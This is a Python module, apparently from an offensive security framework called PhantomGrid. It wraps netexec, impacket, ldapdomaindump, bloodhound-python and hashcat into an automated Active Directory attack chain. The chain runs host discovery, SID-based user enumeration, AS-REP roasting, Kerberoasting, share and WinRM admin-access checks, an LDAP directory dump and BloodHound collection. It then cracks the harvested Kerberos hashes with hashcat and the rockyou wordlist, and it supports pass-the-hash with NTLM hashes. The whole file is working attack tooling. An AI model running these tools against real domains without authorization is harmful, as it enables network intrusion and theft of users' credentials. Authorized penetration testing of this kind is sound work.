"""
tools/ad_tools.py — Active Directory tool wrappers for PhantomGrid.

Each tool subclasses BaseTool and is a thin, parse-only wrapper around a
battle-tested CLI (netexec, impacket, ldapdomaindump, bloodhound-python,
hashcat). Credentials arrive through the ``extra`` dict and are passed straight
to the subprocess — tools call ``_run_proc`` directly (not ``_exec``) so the
command line, which can contain a password or hash, is never written to logs.

Per-target hand-off files written by the scan engine:
  <out>/users.txt            domain users (from lookupsid)  → AS-REP/Kerberoast
  <out>/asrep_hashes.txt     $krb5asrep$ hashes             → crack_asrep
  <out>/kerberoast_hashes.txt$krb5tgs$ hashes               → crack_kerberoast
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from models import ToolCategory
from tools.base import BaseTool, RunResult

# ── Credential helpers ────────────────────────────────────────────


def _creds(extra: dict | None) -> dict:
    extra = extra or {}
    return {
        "ad_domain": (extra.get("ad_domain") or "").strip(),
        "username": (extra.get("username") or "").strip(),
        "password": extra.get("password") or "",
        "ntlm_hash": (extra.get("ntlm_hash") or "").strip(),
    }


def _impacket_principal(c: dict) -> str:
    """Build the impacket principal token, e.g. ``CORP/user:pass`` or ``CORP/user``."""
    user = c["username"]
    dom = c["ad_domain"]
    base = f"{dom}/{user}" if dom else user
    if c["password"] and not c["ntlm_hash"]:
        return f"{base}:{c['password']}"
    return base


def _impacket_auth_flags(c: dict) -> list[str]:
    """Extra impacket flags for hash / null authentication."""
    if c["ntlm_hash"]:
        return ["-hashes", f":{c['ntlm_hash']}"]
    if not c["password"]:
        return ["-no-pass"]
    return []


def _nxc_auth_flags(c: dict) -> list[str]:
    flags = ["-u", c["username"]]
    if c["ntlm_hash"]:
        flags += ["-H", c["ntlm_hash"]]
    else:
        flags += ["-p", c["password"]]
    return flags


# ── Phase 1 — Host Discovery ──────────────────────────────────────

_SMB_LINE = re.compile(
    r"SMB\s+(?P<ip>\d+\.\d+\.\d+\.\d+)\s+\d+\s+(?P<host>\S+)\s+\[\*\]\s+(?P<info>.+)"
)


class HostDiscoveryTool(BaseTool):
    name = "host_discovery"
    binary_name = "nxc"
    category = ToolCategory.DISCOVERY
    description = "Probe the target with netexec (SMB) to confirm a live host/DC and read its OS, hostname and domain."
    parallel_group = "discovery"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        return await self._run_proc(["nxc", "smb", domain], None, 120)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for line in result.lines:
            m = _SMB_LINE.search(line)
            if m:
                rows.append({"host": m.group("ip"), "hostname": m.group("host"), "info": m.group("info").strip()})
        return rows


# ── Phase 2 — User & Group Enumeration ────────────────────────────

_SID_LINE = re.compile(r"\((?P<type>SidType\w+)\)")
_SID_NAME = re.compile(r"\d+:\s+(?:[^\\]+\\)?(?P<name>.+?)\s+\(SidType")


class LookupSidTool(BaseTool):
    name = "lookupsid"
    binary_name = "impacket-lookupsid"
    category = ToolCategory.ACCOUNT
    description = "Enumerate domain users and groups via MS-LSAT SID lookups (impacket-lookupsid)."
    parallel_group = "account"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        target = f"{_impacket_principal(c)}@{domain}"
        cmd = ["impacket-lookupsid", target] + _impacket_auth_flags(c)
        return await self._run_proc(cmd, None, 300)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for line in result.lines:
            t = _SID_LINE.search(line)
            n = _SID_NAME.search(line)
            if not t or not n:
                continue
            sid_type = t.group("type").replace("SidType", "").lower()  # user / group / alias …
            rows.append({"name": n.group("name").strip(), "type": sid_type})
        return rows


# ── Phase 3 — Kerberos Attacks ────────────────────────────────────

_ASREP = re.compile(r"\$krb5asrep\$[^\s]+")
_TGS = re.compile(r"\$krb5tgs\$[^\s]+")


class AsRepRoastTool(BaseTool):
    name = "asrep_roast"
    binary_name = "impacket-GetNPUsers"
    category = ToolCategory.KERBEROS
    description = "AS-REP roasting — request AS-REP hashes for accounts without Kerberos pre-auth (impacket-GetNPUsers)."
    parallel_group = "kerberos"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        users_file = Path(out_dir) / "users.txt"
        cmd = ["impacket-GetNPUsers", _impacket_principal(c), "-dc-ip", domain,
               "-format", "hashcat"] + _impacket_auth_flags(c)
        if users_file.exists() and users_file.stat().st_size > 0:
            cmd += ["-usersfile", str(users_file)]
        else:
            cmd += ["-request"]
        return await self._run_proc(cmd, None, 600)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for h in _ASREP.findall(result.stdout):
            user = h.split("$")[3].split("@")[0] if h.count("$") >= 3 else ""
            rows.append({"user": user, "hash": h, "type": "AS-REP"})
        return rows


class KerberoastTool(BaseTool):
    name = "kerberoast"
    binary_name = "impacket-GetUserSPNs"
    category = ToolCategory.KERBEROS
    description = "Kerberoasting — request service-ticket hashes for accounts with an SPN (impacket-GetUserSPNs)."
    parallel_group = "kerberos"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        cmd = ["impacket-GetUserSPNs", _impacket_principal(c), "-dc-ip", domain,
               "-request"] + _impacket_auth_flags(c)
        return await self._run_proc(cmd, None, 600)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for h in _TGS.findall(result.stdout):
            parts = h.split("$")
            spn = parts[3] if len(parts) > 3 else ""
            rows.append({"spn": spn, "hash": h, "type": "Kerberoast"})
        return rows


# ── Phase 4 — Shares & Services ───────────────────────────────────

_SHARE_LINE = re.compile(
    r"SMB\s+\S+\s+\d+\s+\S+\s+(?P<share>\S+)\s+(?P<perm>READ(?:,WRITE)?|WRITE)\b"
)


class SmbSharesTool(BaseTool):
    name = "smb_shares"
    binary_name = "nxc"
    category = ToolCategory.SHARE
    description = "Enumerate SMB shares and the permissions the supplied account holds on each (netexec --shares)."
    parallel_group = "enum"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        cmd = ["nxc", "smb", domain] + _nxc_auth_flags(c) + ["--shares"]
        if c["ad_domain"]:
            cmd += ["-d", c["ad_domain"]]
        return await self._run_proc(cmd, None, 240)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        seen = set()
        for line in result.lines:
            m = _SHARE_LINE.search(line)
            if m and m.group("share") not in seen:
                seen.add(m.group("share"))
                rows.append({"share": m.group("share"), "permissions": m.group("perm")})
        return rows


class WinRmCheckTool(BaseTool):
    name = "winrm_check"
    binary_name = "nxc"
    category = ToolCategory.SERVICE
    description = "Check whether the account can authenticate over WinRM (and whether it is admin / Pwn3d)."
    parallel_group = "enum"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        cmd = ["nxc", "winrm", domain] + _nxc_auth_flags(c)
        if c["ad_domain"]:
            cmd += ["-d", c["ad_domain"]]
        return await self._run_proc(cmd, None, 120)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        text = result.stdout
        if "Pwn3d!" in text:
            access = "admin (Pwn3d!)"
        elif "[+]" in text:
            access = "authenticated"
        else:
            access = "denied"
        return [{"host": domain, "service": "winrm", "access": access}]


class LdapDumpTool(BaseTool):
    name = "ldap_dump"
    binary_name = "ldapdomaindump"
    category = ToolCategory.LDAP
    description = "Dump the directory over LDAP (users, groups, computers, policy) with ldapdomaindump."
    parallel_group = "enum"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        self._out_dir = Path(out_dir) / "ldap"
        self._out_dir.mkdir(parents=True, exist_ok=True)
        user = f"{c['ad_domain']}\\{c['username']}" if c["ad_domain"] else c["username"]
        cmd = ["ldapdomaindump", "-u", user, "-o", str(self._out_dir), domain]
        if c["ntlm_hash"]:
            cmd += ["-p", f":{c['ntlm_hash']}"]
        elif c["password"]:
            cmd += ["-p", c["password"]]
        return await self._run_proc(cmd, None, 300)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        out = getattr(self, "_out_dir", None)
        if not out or not out.exists():
            return []
        return [{"file": p.name, "bytes": p.stat().st_size}
                for p in sorted(out.iterdir()) if p.is_file()]


# ── Phase 5 — Graph Collection ────────────────────────────────────

class BloodhoundTool(BaseTool):
    name = "bloodhound"
    binary_name = "bloodhound-python"
    category = ToolCategory.GRAPH
    description = "Collect BloodHound data (all collection methods) for attack-path analysis."
    parallel_group = "graph"

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        c = _creds(extra)
        self._out_dir = Path(out_dir) / "bloodhound"
        self._out_dir.mkdir(parents=True, exist_ok=True)
        cmd = ["bloodhound-python", "-u", c["username"], "-d", c["ad_domain"] or domain,
               "-ns", domain, "-c", "all", "--zip"]
        if c["ntlm_hash"]:
            cmd += ["--hashes", f":{c['ntlm_hash']}"]
        elif c["password"]:
            cmd += ["-p", c["password"]]
        return await self._run_proc(cmd, None, 600)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        out = getattr(self, "_out_dir", None)
        if not out or not out.exists():
            return []
        return [{"file": p.name, "bytes": p.stat().st_size}
                for p in sorted(out.iterdir())
                if p.is_file() and (p.suffix in {".json", ".zip"})]


# ── Phase 6 — Credential Cracking ─────────────────────────────────

class _HashcatTool(BaseTool):
    """Shared hashcat cracking base. Subclasses set the mode and source hash file."""
    binary_name = "hashcat"
    category = ToolCategory.CRED
    parallel_group = "crack"
    hashcat_mode = 0
    source_file = ""

    async def run(self, domain, out_dir, data_dir, wordlist, extra) -> RunResult:
        hashes = Path(out_dir) / self.source_file
        if not hashes.exists() or hashes.stat().st_size == 0:
            return RunResult("", "no hashes to crack", 0, 0.0)
        wl = wordlist or "/app/data/wordlists/rockyou.txt"
        mode = str(self.hashcat_mode)
        # Run the attack (best-effort), then print cracked hash:password pairs.
        await self._run_proc(
            ["hashcat", "-m", mode, str(hashes), wl, "--quiet", "--potfile-disable",
             "-o", str(Path(out_dir) / f"{self.name}.potfile")], None, 1800)
        return await self._run_proc(
            ["hashcat", "-m", mode, str(hashes), wl, "--show", "--potfile-disable",
             "--outfile", str(Path(out_dir) / f"{self.name}.show")], None, 120)

    def parse(self, result: RunResult, domain: str) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for line in result.lines:
            if ":" not in line:
                continue
            password = line.rsplit(":", 1)[-1]
            user = ""
            m = re.search(r"\$krb5(?:asrep|tgs)\$\d+\$\*?([^*$@]+)", line)
            if m:
                user = m.group(1)
            rows.append({"user": user, "password": password})
        return rows


class CrackAsRepTool(_HashcatTool):
    name = "crack_asrep"
    description = "Crack harvested AS-REP hashes with hashcat (mode 18200)."
    hashcat_mode = 18200
    source_file = "asrep_hashes.txt"


class CrackKerberoastTool(_HashcatTool):
    name = "crack_kerberoast"
    description = "Crack harvested Kerberoast (TGS) hashes with hashcat (mode 13100)."
    hashcat_mode = 13100
    source_file = "kerberoast_hashes.txt"
